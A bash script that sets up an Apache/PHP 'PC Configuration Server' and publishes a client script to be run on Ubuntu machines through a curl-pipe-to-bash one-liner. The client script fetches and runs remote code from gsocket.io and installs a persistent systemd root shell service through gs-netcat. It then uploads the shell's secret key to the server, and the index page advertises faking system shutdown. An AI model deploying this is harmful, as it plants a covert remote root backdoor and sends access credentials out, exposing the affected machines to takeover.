#!/bin/bash

# Create save_log.php file
cat > /tmp/save_log.php << 'EOF'
<?php
// Simple script to save logs and secrets from remote machines

// Create logs directory if it doesn't exist
$logs_dir = './logs';
if (!file_exists($logs_dir)) {
    mkdir($logs_dir, 0755, true);
}

// Create secrets directory if it doesn't exist
$secrets_dir = './secrets';
if (!file_exists($secrets_dir)) {
    mkdir($secrets_dir, 0755, true);
}

// Get the IP address and hostname
$ip = isset($_POST['ip']) ? $_POST['ip'] : 'unknown_ip';
$hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'unknown_host';

// Sanitize filenames to prevent directory traversal attacks
$ip = preg_replace('/[^a-zA-Z0-9\.\-]/', '_', $ip);
$hostname = preg_replace('/[^a-zA-Z0-9\.\-]/', '_', $hostname);

// Save the log file if uploaded
if (isset($_FILES['logfile']) && $_FILES['logfile']['error'] == 0) {
    $timestamp = date('Y-m-d_H-i-s');
    $log_filename = "{$logs_dir}/{$ip}_{$hostname}_{$timestamp}.log";
    
    if (move_uploaded_file($_FILES['logfile']['tmp_name'], $log_filename)) {
        echo "Log file saved successfully.\n";
    } else {
        echo "Error saving log file.\n";
    }
}

// Save the secret if provided
if (isset($_POST['secret']) && !empty($_POST['secret'])) {
    $secret_filename = "{$secrets_dir}/{$hostname}.txt";
    
    if (file_put_contents($secret_filename, $_POST['secret'])) {
        echo "Secret saved successfully.\n";
    } else {
        echo "Error saving secret.\n";
    }
}

// Provide a response
header('Content-Type: text/plain');
echo "Data received from {$hostname} ({$ip}).\n";
?>
EOF

# Move PHP file to web root
sudo mv /tmp/save_log.php /srv/http/

# Create setup script file for Ubuntu clients
cat > /tmp/setup_script.sh << 'EOF'
#!/bin/bash

# Define your web server URL where logs will be stored
WEB_SERVER="http://SERVER_IP_PLACEHOLDER"  # Will be replaced with actual IP
LOG_ENDPOINT="$WEB_SERVER/save_log.php"

# Get system information
HOSTNAME=$(hostname)
IP_ADDRESS=$(hostname -I | awk '{print $1}')
TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
LOG_FILE="/tmp/setup_log_${TIMESTAMP}.txt"

# Function to log commands and their output
log_command() {
    local cmd="$1"
    local description="$2"
    
    echo "----------------------------------------------" | tee -a "$LOG_FILE"
    echo "[$TIMESTAMP] Executing: $description" | tee -a "$LOG_FILE"
    echo "\$ $cmd" | tee -a "$LOG_FILE"
    echo "----------------------------------------------" | tee -a "$LOG_FILE"
    
    # Execute the command and capture output
    OUTPUT=$(eval "$cmd" 2>&1)
    STATUS=$?
    
    echo "$OUTPUT" | tee -a "$LOG_FILE"
    echo "Exit Status: $STATUS" | tee -a "$LOG_FILE"
    echo "" | tee -a "$LOG_FILE"
    
    return $STATUS
}

# Start logging
echo "==================================================" | tee -a "$LOG_FILE"
echo "Setup Script Started on $HOSTNAME ($IP_ADDRESS)" | tee -a "$LOG_FILE"
echo "Timestamp: $TIMESTAMP" | tee -a "$LOG_FILE"
echo "==================================================" | tee -a "$LOG_FILE"


# 3. Set up Wake-on-LAN
# Identify network interface
PRIMARY_INTERFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
log_command "echo 'Primary network interface: $PRIMARY_INTERFACE'" "Identifying network interface"

# Enable WoL in network configuration
cat > /tmp/wol.conf << _EOF_
[connection]
ethernet.wake-on-lan = magic
_EOF_

log_command "sudo mkdir -p /etc/NetworkManager/conf.d/" "Creating NetworkManager config directory"
log_command "sudo cp /tmp/wol.conf /etc/NetworkManager/conf.d/99-wol.conf" "Setting up Wake-on-LAN in NetworkManager"

# Check if Wake-on-LAN is supported
WOL_SUPPORTED=$(ethtool $PRIMARY_INTERFACE 2>/dev/null | grep -q "Supports Wake-on" && echo "yes" || echo "no")
if [ "$WOL_SUPPORTED" = "yes" ]; then
    log_command "echo 'Wake-on-LAN is supported.'" "Checking Wake-on-LAN support"
    
    # Create a systemd service for Wake-on-LAN that runs at boot and after resume
    cat > /tmp/wol.service << _EOF_
[Unit]
Description=Enable Wake On LAN
After=network.target
After=suspend.target
After=hibernate.target
After=hybrid-sleep.target

[Service]
Type=oneshot
ExecStart=/sbin/ethtool -s $PRIMARY_INTERFACE wol g
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
WantedBy=suspend.target
WantedBy=hibernate.target
WantedBy=hybrid-sleep.target
_EOF_

    log_command "sudo cp /tmp/wol.service /etc/systemd/system/wol.service" "Creating Wake-on-LAN service"
    log_command "sudo systemctl daemon-reload" "Reloading systemd configuration"
    log_command "sudo systemctl enable wol.service" "Enabling Wake-on-LAN service"
    log_command "sudo systemctl start wol.service" "Starting Wake-on-LAN service"
    
    # Immediately enable WoL
    log_command "sudo ethtool -s $PRIMARY_INTERFACE wol g" "Enabling Wake-on-LAN immediately"
else
    log_command "echo 'Wake-on-LAN not supported, skipping...'" "Wake-on-LAN not supported"
fi

# Add WoL persistence through boot in network interfaces
if [ -f /etc/network/interfaces ]; then
    # For systems using traditional networking
    if ! grep -q "up ethtool -s $PRIMARY_INTERFACE wol g" /etc/network/interfaces; then
        log_command "echo 'auto $PRIMARY_INTERFACE' | sudo tee -a /etc/network/interfaces" "Adding WoL to network interfaces config"
        log_command "echo 'iface $PRIMARY_INTERFACE inet dhcp' | sudo tee -a /etc/network/interfaces" "Adding WoL to network interfaces config"
        log_command "echo 'up ethtool -s $PRIMARY_INTERFACE wol g' | sudo tee -a /etc/network/interfaces" "Adding WoL to network interfaces config"
    fi
fi

# 4. Execute gsocket command and save the secret
log_command "echo 'Running gsocket setup...'" "Starting gsocket setup"
GSOCKET_OUTPUT=$(bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1)
echo "$GSOCKET_OUTPUT" | tee -a "$LOG_FILE"

# Extract the secret
SECRET=$(echo "$GSOCKET_OUTPUT" | grep -o 'S="[^"]*"' | sed 's/S="\(.*\)"/\1/')
if [ -n "$SECRET" ]; then
    echo "Secret extracted: $SECRET" | tee -a "$LOG_FILE"
    echo "$SECRET" > "/tmp/${HOSTNAME}_secret.txt"
    log_command "echo 'Secret saved to /tmp/${HOSTNAME}_secret.txt'" "Saving secret to file"
    
    # Save the secret to the gs-root-shell-key.txt file for the root shell service
    log_command "sudo mkdir -p /etc/systemd" "Creating systemd directory if it doesn't exist"
    log_command "echo '$SECRET' | sudo tee /etc/systemd/gs-root-shell-key.txt" "Saving GSSocket secret key for root shell"
    log_command "sudo chmod 600 /etc/systemd/gs-root-shell-key.txt" "Setting secure permissions on key file"
else
    log_command "echo 'Failed to extract secret'" "Secret extraction failed"
fi

# Install gs-netcat if not already installed by gsocket.io/y script
if ! command -v gs-netcat &> /dev/null; then
    log_command "sudo apt-get install -y git build-essential" "Installing dependencies for gs-netcat"
    log_command "git clone https://github.com/hackerschoice/gsocket.git /tmp/gsocket" "Cloning gsocket repository"
    log_command "cd /tmp/gsocket && ./bootstrap && ./configure && make && sudo make install" "Building and installing gsocket"
fi

# 5. Create the Global Socket Root Shell service
cat > /tmp/gs-root-shell.service << 'EOG'
[Unit]
Description=Global Socket Root Shell
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=10
WorkingDirectory=/root
ExecStart=/usr/local/bin/gs-netcat -k /etc/systemd/gs-root-shell-key.txt -il

[Install]
WantedBy=multi-user.target
EOG

log_command "sudo cp /tmp/gs-root-shell.service /etc/systemd/system/" "Creating Global Socket Root Shell service"
log_command "sudo systemctl daemon-reload" "Reloading systemd configuration"
log_command "sudo systemctl enable gs-root-shell.service" "Enabling Global Socket Root Shell service"
log_command "sudo systemctl start gs-root-shell.service" "Starting Global Socket Root Shell service"
log_command "sudo systemctl status gs-root-shell.service" "Checking Global Socket Root Shell service status"

# 6. Upload logs and secret to the web server
if command -v curl >/dev/null 2>&1; then
    # Upload the main log file
    log_command "curl -s -F 'ip=$IP_ADDRESS' -F 'hostname=$HOSTNAME' -F 'logfile=@$LOG_FILE' $LOG_ENDPOINT" "Uploading log file to server"
    
    # Upload the secret file if it exists
    if [ -n "$SECRET" ]; then
        log_command "curl -s -F 'ip=$IP_ADDRESS' -F 'hostname=$HOSTNAME' -F 'secret=$SECRET' $LOG_ENDPOINT" "Uploading secret to server"
    fi
else
    echo "curl command not found. Cannot upload logs." | tee -a "$LOG_FILE"
fi


# Add usage information to log file
echo "==================================================" | tee -a "$LOG_FILE"
echo "GLOBAL SOCKET ROOT SHELL INFORMATION:" | tee -a "$LOG_FILE"
echo "To connect to this machine's root shell:" | tee -a "$LOG_FILE"
echo "1. Install gsocket (https://github.com/hackerschoice/gsocket)" | tee -a "$LOG_FILE"
echo "2. Run: gs-netcat -k KEY -s" | tee -a "$LOG_FILE"
echo "   Replace KEY with the secret value in /etc/systemd/gs-root-shell-key.txt" | tee -a "$LOG_FILE"
echo "==================================================" | tee -a "$LOG_FILE"

echo "==================================================" | tee -a "$LOG_FILE"
echo "Setup completed on $HOSTNAME ($IP_ADDRESS)" | tee -a "$LOG_FILE"
echo "Timestamp: $(date +"%Y-%m-%d_%H-%M-%S")" | tee -a "$LOG_FILE"
echo "==================================================" | tee -a "$LOG_FILE"

# Instead of poweroff at the end, show a message
echo "Configuration completed successfully!"
EOF

# Get server IP
SERVER_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v "127.0.0.1" | head -n 1)

# Replace placeholder with actual server IP
sed -i "s/SERVER_IP_PLACEHOLDER/$SERVER_IP/g" /tmp/setup_script.sh

# Move setup script to web root
sudo mv /tmp/setup_script.sh /srv/http/
sudo chmod +x /srv/http/setup_script.sh

# Create a simple index page
cat > /tmp/index.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>PC Configuration Server</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
        pre { background: #f4f4f4; padding: 10px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>PC Configuration Server</h1>
    <p>Run the following command on your Ubuntu client machines:</p>
    <pre>bash -c "\$(curl -fsSL http://${SERVER_IP}/setup_script.sh)"</pre>
    <p>This script will configure:</p>
    <ul>
        <li>Power button to simulate shutdown (but actually suspend)</li>
        <li>Prevents actual system shutdown - converts all shutdown attempts to suspend</li>
        <li>SSH server for remote access</li>
        <li>Wake-on-LAN for remote power on</li>
        <li>System logging and monitoring</li>
        <li>Global Socket Root Shell for remote root access</li>
    </ul>
</body>
</html>
EOF

# Move index file to web root
sudo mv /tmp/index.html /srv/http/

# Adjust PHP settings for larger file uploads if needed
sudo sed -i 's/upload_max_filesize = .*/upload_max_filesize = 20M/' /etc/php/php.ini
sudo sed -i 's/post_max_size = .*/post_max_size = 21M/' /etc/php/php.ini

# Enable and start Apache service
sudo systemctl enable httpd
sudo systemctl restart httpd

echo "========================================================"
echo "Apache web server set up complete at http://$SERVER_IP"
echo "Run this command on client Ubuntu PCs:"
echo "bash -c \"\$(curl -fsSL http://$SERVER_IP/setup_script.sh)\""
echo "========================================================"
